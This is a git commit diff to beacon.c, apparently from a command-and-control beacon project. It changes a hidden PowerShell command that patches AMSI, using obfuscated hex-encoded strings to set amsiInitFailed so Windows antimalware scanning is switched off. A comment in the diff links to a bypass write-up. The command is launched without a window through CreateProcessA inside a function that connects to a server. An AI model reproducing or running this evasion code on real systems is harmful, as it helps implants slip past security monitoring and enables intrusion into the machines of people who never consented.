ac5972e9412f03d6892172cdbbef9f8dbc59ae3e
Yassir Laaouissi <yassirlaaouissi1@gmail.com>
2023-02-13 20:02:11 +0100

    maybe its the pipe

--- beacon.c
+++ beacon.c
@@ -128,7 +128,7 @@ void beacon_connect_to_server(char IP[16], int PORT){
         PROCESS_INFORMATION pinfo;
         //Patch AMSI https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/
         // [Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)
-        char proc[] = "powershell.exe -WindowStyle Hidden | [Ref].Assembly.GetType('System.Management.Automation.'+$(\"41 6D 73 69 55 74 69 6C 73\".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($(\"61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64\".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)";
+        char proc[] = "powershell.exe -WindowStyle Hidden [Ref].Assembly.GetType('System.Management.Automation.'+$(\"41 6D 73 69 55 74 69 6C 73\".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($(\"61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64\".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)";
         printf("helloooo");
         CreateProcessA(NULL, proc, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
         printf("helloooo");
